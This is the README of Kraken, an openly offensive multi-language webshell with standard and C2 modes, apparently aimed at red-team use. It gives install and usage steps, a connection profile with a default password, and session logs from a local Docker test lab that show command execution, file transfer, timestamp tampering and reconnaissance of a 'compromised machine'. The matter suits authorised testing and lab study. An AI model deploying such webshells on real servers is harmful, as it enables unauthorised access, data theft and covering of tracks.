# Kraken

<h1 align="center">
  <br>
  <img src="static/kraken-logo-background.jpg" alt="Kraken">
</h1>

<h4 align="center">Kraken, a modular multi-language webshell coded by @secu_x11.</h4>

<p align="center">
  <a href="#verion">Version</a> •
  <a href="#requirements">Requirements</a> •
  <a href="#support">Support</a> •
  <a href="#install">Install</a> •
  <a href="#usage">Usage</a> •
  <a href="#examples">Examples</a> •
  <a href="#contributing">Contributing</a> •
  <a href="#bugs">Bugs</a>
</p>

<p align="center">
  <a href="https://github.com/kraken-ng/Kraken/blob/main/README.md">English</a> •
  <a href="https://github.com/kraken-ng/Kraken/blob/main/README_ES.md">Spanish</a>
</p>

---

## Version

1.0.0 - [Version changelog](CHANGELOG.md)

## Requirements

In order to use the tool, the following requirements must first be satisfied:

- **python3.8** (>= 3.8): the tool contains syntax elements that are only available in versions >= of Python 3.8.
- **pip**: in the file [requirements.txt](requirements.txt) are the set of libraries that need to be installed for the tool to work. It is important that the pip version is linked to the Python version, otherwise the libraries will not work.
- **Docker** (>= 20.10.12): because the modules must be cross-compiled in Java, as no other way has been found to do it, we have chosen to use Docker containers to make this process as elegant and clean as possible.

Although it is not a requirement, **it is recommended** to use the tool on a Linux operating system to ensure (within expectations), the correct functioning.

## Support

On the one hand, Kraken is supported in different technologies and versions. The following is a list of where Kraken agents are supported:

- **PHP (php):**
  - 5.4, 5.5, 5.6
  - 7.0, 7.1, 7.2, 7.3, 7.4
  - 8.0, 8.1, 8.2
- **JAVA (jsp):**
  - 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17
- **.NET (aspx):**
  - 3.5
  - 4.0
  - 4.5, 4.5.1, 4.5.2
  - 4.6, 4.6.1, 4.6.2
  - 4.7, 4.7.1, 4.7.2
  - 4.8

On the other hand, it is possible to consult the list of versions and technologies supported by each Kraken module. It is available [here](https://github.com/kraken-ng/modules/blob/main/README.md).

You can check (manually) the compatibility of the modules through the utility: [check_syntax](https://github.com/kraken-ng/utils/blob/main/check_syntax/README.md).

## Install

It is not mandatory to do it this way, but it is **RECOMMENDED** to avoid possible errors or unexpected failures during the use of Kraken:

First of all, start by installing [Conda](https://docs.conda.io/projects/conda/en/stable/) or [Miniconda](https://docs.conda.io/en/latest/miniconda.html). This tool will allow you to manage different python "environments" isolated from each other and with different libraries and dependencies. The installation process is very simple, and can be followed here: [Linux](https://conda.io/projects/conda/en/stable/user-guide/install/linux.html) or [Windows](https://conda.io/projects/conda/en/stable/user-guide/install/windows.html)

Once conda is installed, an environment is created for Kraken:

```shell
conda create -n kraken python=3.8
conda activate kraken
```

> Using this method, it is not necessary to specify the version of Python or Pip, nor do we have visibility problems with the installed python libraries, as everything stays in the virtual environment created with conda.

Then proceed to clone the repository and install the dependencies:

```shell
git clone --recurse-submodules https://github.com/kraken-ng/Kraken.git
cd Kraken
pip install -r requirements.txt
python kraken.py -h
```

> It is very important to clone the existing repository and **submodules** because Kraken components are spread across different repositories. Otherwise, Kraken will not work properly.

The next requirement, Docker, can be avoided in case of using PHP and/or ASPX versions of Kraken agents. In the case of using Java, it is necessary to install docker to be able to compile the modules. Although, it is recommended to continue with the installation to have all the requirements installed.

Continuing with the installation, we proceed to install **Docker**. This tool can be downloaded either from the package manager or from the [official website](https://docs.docker.com/engine/install/). In principle, the installation process is simple and guided. At the end, simply add your user to the docker group and reboot, so that it can download and deploy the containers. This can be done with:

```shell
sudo usermod -aG docker $USER
```

Additionally, as an **optional** and recommended dependency (depending on the use you are going to give to the tool), we propose the **Docker-Compose** tool, which will be necessary exclusively to deploy the development and/or test environments. It can be installed from the [official website](https://docs.docker.com/compose/install/) or, during the installation of Docker, through the repositories (if not installed before):

```shell
sudo apt install docker-compose-plugin
```

## Usage

After having completed the installation phase, the use of the tool begins:

```
usage: kraken.py [-h] [-g] [-c] [-m {st,c2}] -p PROFILE -k {raw,container} [-d] [-l]

Kraken, a modular multi-language webshell (coded by @secu_x11)

optional arguments:
  -h, --help            show this help message and exit
  -g, --generate        Generate a webshell (php/jsp/aspx)
  -c, --connect         Connect to a deployed webshell
  -m {st,c2}, --mode {st,c2}
                        Mode of operation with agent
  -p PROFILE, --profile PROFILE
                        Filepath of Connection Profile to use
  -k {raw,container}, --compiler {raw,container}
                        Name of the compiler to use
  -d, --debug           Turn ON Debug Mode
  -l, --log             Log all executed commands and outputs

```

First, an agent must be uploaded in order to be able to communicate with it using Kraken. The agents are located under the [agents](https://github.com/kraken-ng/agents) directory and there are 2 types: **standard** and **c2** which depend on the operation mode you want to use (for more information, consult the wiki).

After uploading the agent and having the URL with the path where it has been uploaded, a **Connection Profile** must be created. The process of creating connection profiles is detailed in the wiki). However, you can check some existing ones [here](https://github.com/kraken-ng/utils/tree/main/req2profile/examples).

Once the connection profile has been created, the second step is to connect to the agent, this can be done with the following command (depending on the agent used, one way or another will be specified):

```shell
python kraken.py --connect --mode <MODE> --profile <PROFILE_FILEPATH> --compiler <COMPILER>
```

After connecting to the agent, Kraken will load the modules that can be used with the agent, and it will give a prompt. Through the prompt, you can consult the available modules by pressing the `<SPACE>` key or directly with the `help` command.

## Examples

As an example, the testing LAMP environment will be used. A **STANDARD** agent will be deployed in the PHP 8 container.

First, deploy PHP containers with Docker Compose:

```
(kraken) secu@x11:~/Kraken$ docker compose -f envs/php/docker-compose.yml up -d
[+] Running 4/4
 ⠿ Network php_apps       Created                                                             0.0s
 ⠿ Container php5-apache  Started                                                             0.6s
 ⠿ Container php7-apache  Started                                                             0.6s
 ⠿ Container php8-apache  Started                                                             0.4s
```

> During deployment with Docker Compose the Standard Agent is copied to the web service directory automatically, so we don't have to upload it manually.

The second step is to create or choose a connection profile to communicate with the deployed agent. In this case, as we are using a test environment, its corresponding connection profile can be used: [profile_testing_php_linux_st.json](https://github.com/kraken-ng/utils/blob/main/req2profile/examples/profile_testing_php_linux_st.json).

```json
{
  "client" : {
    "url" : "http://localhost:8000/agent_st.php",
    "skip_ssl": false,
    "method" : "POST",
    "headers" : {
      "Host" : "localhost:8000",
      "User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    },
    "cookies" : {},
    "fields" : {},
    "message" : {
      "secret" : {
        "type" : "COOKIE",
        "key" : "X-Authorization",
        "value" : "P4ssw0rd!"
      },
      "data" : {
        "type" : "FIELD",
        "key" : "data"
      }
    }
  },
  "server" : {
    "type" : "FIELD",
    "key" : "data"
  }
}
```

In this profile, we can configure all the connection parameters to suit our needs. However, if changes are made (such as the password), these must be reflected in the agent:

```php
public  $REQUEST_METHOD    = "POST";
private $PASSWORD_TYPE     = "COOKIE";
private $PASSWORD_KEY      = "X-Authorization";
private $PASSWORD_VALUE    = "P4ssw0rd!";
private $REQUEST_DATA_TYPE = "FIELD";
private $REQUEST_DATA_KEY  = "data";
private $RESPONSE_DATA_KEY = "data";
```

> For this example, no data will be modified, since a test environment for PHP is used. But **it is recommended** to modify this information when used outside a test environment.

Finally, with the connection profile ready, proceed to connect to the agent:

```
(kraken) secu@x11:~/Kraken$ python kraken.py -c -m st -p utils/req2profile/examples/profile_testing_php_linux_st.json -k raw
(ST) www-data@c48827a1b2ac:/var/www/html$ help

+------------+--------+-----------------------------------------------------------------------------------+-----------------+
|  Command   |  Type  |                                    Description                                    |     Authors     |
+------------+--------+-----------------------------------------------------------------------------------+-----------------+
|    exit    |  Core  |                          Ends the session with the agent                          |    @secu_x11    |
|    help    |  Core  | Displays the available commands or information of a command passed as an argument |    @secu_x11    |
|    cat     | Module |                                 Read file contents                                |    @secu_x11    |
|     cd     | Module |                              Change working directory                             |    @secu_x11    |
|   chmod    | Module |                 Change file permissions of file or multiple files                 |    @secu_x11    |
|     cp     | Module |                            Copy file or multiple files                            |    @secu_x11    |
|  download  | Module |                       Download a remote file to a local path                      |    @secu_x11    |
|  execute   | Module |                  Execute a binary or command and retrieve output                  |    @secu_x11    |
|    find    | Module |                      Find files of directory using a pattern                      |    @secu_x11    |
|    grep    | Module |                  Search for files whose content matches a pattern                 |    @secu_x11    |
|     id     | Module |              Displays information about the currently logged-in user              |    @secu_x11    |
|     ls     | Module |                             List files or directories                             |    @secu_x11    |
|   mkdir    | Module |                      Create directories and/or subdirectories                     | @r1p, @secu_x11 |
|  netstat   | Module |              Show listening ports, arp table and machine's net routes             |    @secu_x11    |
|     ps     | Module |                     List the processes running on the machine                     |    @secu_x11    |
|    pspy    | Module |                          Monitor processes on the machine                         |    @secu_x11    |
|     rm     | Module |                           Remove file or multiple files                           |    @secu_x11    |
|  sysinfo   | Module |                  Get basic system info about compromised machine                  |    @secu_x11    |
| tcpconnect | Module |                                Connect to TCP Port                                |    @secu_x11    |
|   touch    | Module |               Change the date of an existing file or multiple files               |    @secu_x11    |
|   upload   | Module |                       Upload a local file to remote filepath                      |    @secu_x11    |
|  webinfo   | Module |                Get basic web server info about compromised machine                |    @secu_x11    |
+------------+--------+-----------------------------------------------------------------------------------+-----------------+

(ST) www-data@c48827a1b2ac:/var/www/html$ help touch                                                                                    
usage: touch datetime [files [files ...]]

Change the date of an existing file or multiple files

positional arguments:
  datetime  Date represented in 'd/m/Y-H:i:s' format
  files     File/s to change date

Examples:
  touch 01/01/2022-00:00:00 example.txt
  touch 01/01/2022-00:00:00 /tmp/passwd
  touch 01/01/2022-00:00:00 ../test_1.txt ../test_2.txt
  touch 01/01/2022-00:00:00 C:/Windows/Tasks/example.txt

(ST) www-data@c48827a1b2ac:/var/www/html$ sysinfo                                                                                       
Hostname: c48827a1b2ac
IP: 172.19.0.2
OS: Linux c48827a1b2ac 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64
User: www-data
Path: /var/www/html/agent_st.php
Version: 8.0.25

(ST) www-data@c48827a1b2ac:/var/www/html$ cd ..                                                                                         
(ST) www-data@c48827a1b2ac:/var/www$ ls

                
  drwxr-xr-x  1      root      root      4096   2022/11/15 04:13:21  .      
  drwxr-xr-x  1      root      root      4096   2022/11/15 04:13:21  ..     
  drwxrwxrwx  1      www-data  www-data  4096   2023/02/21 22:58:28  html   

(ST) www-data@c48827a1b2ac:/var/www$ exit

```

It is also possible to use **C2** mode as shown below:

```
(kraken) secu@x11:~/Kraken$ python kraken.py -c -m c2 -p utils/req2profile/examples/profile_testing_php_linux_c2.json -k raw
[*] Detected new cookie: "PHPSESSID" = "deaa1240ada8f3afe949f5fc070bfab3"
(C2) www-data@c48827a1b2ac:/var/www/html$ help                                                                                          
+-----------------+--------+-----------------------------------------------------------------------------------+-----------------+
|     Command     |  Type  |                                    Description                                    |     Authors     |
+-----------------+--------+-----------------------------------------------------------------------------------+-----------------+
|       exit      |  Core  |                          Ends the session with the agent                          |    @secu_x11    |
|       help      |  Core  | Displays the available commands or information of a command passed as an argument |    @secu_x11    |
|   list_modules  |  Core  |                          List modules loaded in the agent                         |    @secu_x11    |
|   load_module   |  Core  |        Load a new agent module/s (use 'all' to load all available modules)        |    @secu_x11    |
|  unload_module  |  Core  |     Unload an existing agent module/s (use 'all' to unload all loaded modules)    |    @secu_x11    |
| refresh_modules |  Core  |          Refresh module status from agent (update agent's memory in use)          |    @secu_x11    |
|  clean_modules  |  Core  |                              Unload all agent modules                             |    @secu_x11    |
|       cat       | Module |                                 Read file contents                                |    @secu_x11    |
|        cd       | Module |                              Change working directory                             |    @secu_x11    |
|      chmod      | Module |                 Change file permissions of file or multiple files                 |    @secu_x11    |
|        cp       | Module |                            Copy file or multiple files                            |    @secu_x11    |
|     download    | Module |                       Download a remote file to a local path                      |    @secu_x11    |
|     execute     | Module |                  Execute a binary or command and retrieve output                  |    @secu_x11    |
|       find      | Module |                      Find files of directory using a pattern                      |    @secu_x11    |
|       grep      | Module |                  Search for files whose content matches a pattern                 |    @secu_x11    |
|        id       | Module |              Displays information about the currently logged-in user              |    @secu_x11    |
|        ls       | Module |                             List files or directories                             |    @secu_x11    |
|      mkdir      | Module |                      Create directories and/or subdirectories                     | @r1p, @secu_x11 |
|     netstat     | Module |              Show listening ports, arp table and machine's net routes             |    @secu_x11    |
|        ps       | Module |                     List the processes running on the machine                     |    @secu_x11    |
|       pspy      | Module |                          Monitor processes on the machine                         |    @secu_x11    |
|        rm       | Module |                           Remove file or multiple files                           |    @secu_x11    |
|     sysinfo     | Module |                  Get basic system info about compromised machine                  |    @secu_x11    |
|    tcpconnect   | Module |                                Connect to TCP Port                                |    @secu_x11    |
|      touch      | Module |               Change the date of an existing file or multiple files               |    @secu_x11    |
|      upload     | Module |                       Upload a local file to remote filepath                      |    @secu_x11    |
|     webinfo     | Module |                Get basic web server info about compromised machine                |    @secu_x11    |
+-----------------+--------+-----------------------------------------------------------------------------------+-----------------+

(C2) www-data@c48827a1b2ac:/var/www/html$ list_modules                                                                                  
+----+------+----------+------+
| ID | Name | Filepath | Date |
+----+------+----------+------+
+----+------+----------+------+
Total memory in use: 0 B

(C2) www-data@c48827a1b2ac:/var/www/html$ load_module sysinfo ls id cd                                                                  
[*] Loaded module 'sysinfo' successfully
[*] Loaded module 'ls' successfully
[*] Loaded module 'id' successfully
[*] Loaded module 'cd' successfully

(C2) www-data@c48827a1b2ac:/var/www/html$ list_modules                                                                                  
+------------+---------+----------------------------------+---------------------+
|     ID     |   Name  |             Filepath             |         Date        |
+------------+---------+----------------------------------+---------------------+
| 523453412  | sysinfo | modules/sysinfo/sysinfo.php8.php | 2023/02/22 00:12:57 |
| 1915659346 |    ls   |      modules/ls/ls.php8.php      | 2023/02/22 00:12:57 |
| 238096256  |    id   |      modules/id/id.php8.php      | 2023/02/22 00:12:57 |
| 1992344736 |    cd   |      modules/cd/cd.php8.php      | 2023/02/22 00:12:57 |
+------------+---------+----------------------------------+---------------------+
Total memory in use: 7.82 KB

(C2) www-data@c48827a1b2ac:/var/www/html$ sysinfo                                                                                       
Hostname: c48827a1b2ac
IP: 172.19.0.2
OS: Linux c48827a1b2ac 5.15.0-58-generic #64-Ubuntu SMP Thu Jan 5 11:43:13 UTC 2023 x86_64
User: www-data
Path: /var/www/html/agent_c2.php
Version: 8.0.25

(C2) www-data@c48827a1b2ac:/var/www/html$ cd ..                                                                                         
(C2) www-data@c48827a1b2ac:/var/www$ ls                                                                                                 
                
  drwxr-xr-x  1      root      root      4096   2022/11/15 04:13:21  .      
  drwxr-xr-x  1      root      root      4096   2022/11/15 04:13:21  ..     
  drwxrwxrwx  1      www-data  www-data  4096   2023/02/21 22:58:28  html   

(C2) www-data@c48827a1b2ac:/var/www$ unload_module id                                                                                   
[*] Unloaded module 'id' successfully

(C2) www-data@c48827a1b2ac:/var/www$ list_modules                                                                                       
+------------+---------+----------------------------------+---------------------+
|     ID     |   Name  |             Filepath             |         Date        |
+------------+---------+----------------------------------+---------------------+
| 523453412  | sysinfo | modules/sysinfo/sysinfo.php8.php | 2023/02/22 00:12:57 |
| 1915659346 |    ls   |      modules/ls/ls.php8.php      | 2023/02/22 00:12:57 |
| 1992344736 |    cd   |      modules/cd/cd.php8.php      | 2023/02/22 00:12:57 |
+------------+---------+----------------------------------+---------------------+
Total memory in use: 6.63 KB

(C2) www-data@c48827a1b2ac:/var/www$ clean_modules                                                                                      
[*] Clean modules from agent successfully

(C2) www-data@c48827a1b2ac:/var/www$ list_modules                                                                                       
+----+------+----------+------+
| ID | Name | Filepath | Date |
+----+------+----------+------+
+----+------+----------+------+
Total memory in use: 0 B

(C2) www-data@c48827a1b2ac:/var/www$ exit                                                                                               
```

For more information or to consult the advanced usage guide, visit the project's wiki.

## Contributing

To contribute to the project: either with new agents, modules or other functionalities, visit the project wiki. The contributions section will detail the whole process to be done for each contribution case.

## Bugs

If any bugs or anomalies are identified with Kraken agents, modules or the tool itself, please open a **issue** and an ASAP fix will be attempted.

